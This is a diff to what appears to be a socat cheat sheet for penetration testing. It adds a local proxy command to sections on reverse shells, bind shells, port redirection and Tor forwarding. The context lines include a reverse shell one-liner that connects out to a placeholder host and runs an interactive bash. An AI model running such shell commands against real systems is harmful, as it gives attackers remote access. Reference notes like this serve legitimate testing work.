@@ -37,6 +37,8 @@ On Linux
 socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
 ```
 
+
+
 #### Bind Shells
 Start a bind listener
 ```bash
@@ -146,6 +148,11 @@ socat -u udp-recvfrom:1234,fork tcp:localhost:4321
 # TOR-forwarding (needs tor-daemon on port 9050 running)
 socat tcp4-listen:8080,reuseaddr,fork socks4A:127.0.0.1:t0rhidd3ns3rvice.onion:80,socksport=9050
 #https://superuser.com/questions/1302861/how-i-can-make-port-forwarding-using-tor#1302869
+```
+
+Socat as a Proxy
+```bash
+socat TCP-LISTEN:6969,fork,reuseaddr,bind=127.0.0.1 TCP:remote_ip:remote_port
 ```
 
 ## Port Redirection and Tunnelling with `socat`
